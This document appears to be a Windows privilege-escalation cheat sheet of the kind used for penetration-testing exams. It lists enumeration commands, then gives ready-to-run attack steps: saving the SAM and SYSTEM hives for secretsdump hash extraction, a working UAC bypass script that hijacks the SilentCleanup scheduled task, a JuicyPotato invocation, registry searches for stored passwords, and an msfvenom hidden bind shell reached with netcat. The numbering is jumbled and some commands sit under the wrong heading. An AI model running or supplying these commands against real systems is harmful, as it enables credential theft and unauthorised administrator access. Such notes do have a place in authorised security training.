## INTERNAL RECONNAISANCE
1. Enumerating the operating system version and architecture
`systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`

2. Enumerating processes and services
`tasklist /SVC`

3. Enumerating Networking Information
`ipconfig /all`
`route print`
`netstat -ano`

4. Enumerating Firewall status and rules
`netsh advfirewall show currentprofile`
`netsh advfirewall firewall show rule name=all`

5. Enumerating scheduled tasks
`schtasks /query /fo LIST /v`

6. Enumerating installed applications and patch levels
**NOTE: WMIC returns ONLY installed by Microsoft Installer** 
`wmic product get name, version, vendor`

`wmic qfe get Caption, Description, HotFixID, InstalledOn`

7.  Enumerating installed applications and patch levels
`.\accesschk.exe -uws "Everyone" "C:\Program Files"`
`Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}`

8. Enumerating unmounted disks
`mountvol`

9. Enumerating Device drivers and kernel modules
`driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path`

`Get-WmiObject Win32\_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$\_.DeviceName -like "\*VMware\*"}`

10. Enumerating binaries that autoelevate 
**NOTE: If this key is enabled (set to 1) in either HKEY\_CURRENT\_USER or HKEY\_LOCAL\_MACHINE, any user can run Windows Installer packages with elevated privileges.**

11. Insecure File permissions.
- List the service that is running.
`Get-WmiObject win32\_service | Select-Object Name, State, PathName | Where-Object {$\_.State -like 'Running'}`

- Check if any users has read and write access to change to binary by malicious one.
`icacls "C:\\Program Files\\Serviio\\bin\\ServiioService.exe"`

- Unquoted service vulnerability can be use to elevate the privileges from any user to administrator, replacing the unquoted path with malicious binary.

`reg query HKEY\_CURRENT\_USER\\Software\\Policies\\Microsoft\\Windows\\Installer`

`reg query HKEY\_LOCAL\_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Installer`



1.secretsdump.py -sam sam -system system local
  secretsdump.py -ntds ntds.dit -system system local
- grab the sam and system in the victim
- if sam is not available NTDT.dit is another optios

```
reg save hklm\sam c:\sam
reg save hklm\system c:\system
```

2. Mapped Drives
```
 $pw = convertto-securestring 'aliceishere' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('Bethany\Alice',$pw)
 New-PSDrive -Name test -PSProvider FileSystem -Credential $creds -Root \\192.168.119.123\test
 ```
 
 3. Find specific text

a. powershell
```
gci -recurse -filter monkey.exe -File -ErrorAction SilentlyContinue
```

b. cmd
```
dir /b/s *.txt
dir /s /b network-secret.txt
```
2. UAC BYPASS
```
if(((\[System.Security.Principal.WindowsIdentity\]::GetCurrent()).groups -match "S-1-5-32-544")) {
    #Payload goes here
    #It'll run as Administrator
} else {
    $registryPath = "HKCU:\\Environment"
    $Name = "windir"
    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
    schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I | Out-Null
    Remove-ItemProperty -Path $registryPath -Name $name
}
```

[Powershell \*real\* UAC Bypass - Bash Bunny - Hak5 Forums](https://forums.hak5.org/topic/45439-powershell-real-uac-bypass/)


3. PRIVESC on WIndows XP
[Windows XP SP0/SP1 Privilege Escalation to System Tutorial (sohvaxus.github.io)](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)


4. JUICYPOTATO
`.\jp.exe -t * -p 'c:\users\all users\run.bat' -l 1337 -c '{C49E32C6-BC8B-11d2-85D4-00105A1F8304}'`

5. Query passwords.
`reg query HKLM /f password /t REG\_SZ /s`
`reg query HKCU /f password /t REG\_SZ /s`


## DIFFICULTY TO GET REVERSE SHELL TRY CREATE A BIND SHELL
`msfvenom -p windows/shell_hidden_bind_tcp AHOST=172.16.1.100 LPORT=443 -f exe -o hidden.exe`
`nc <ip> <port>`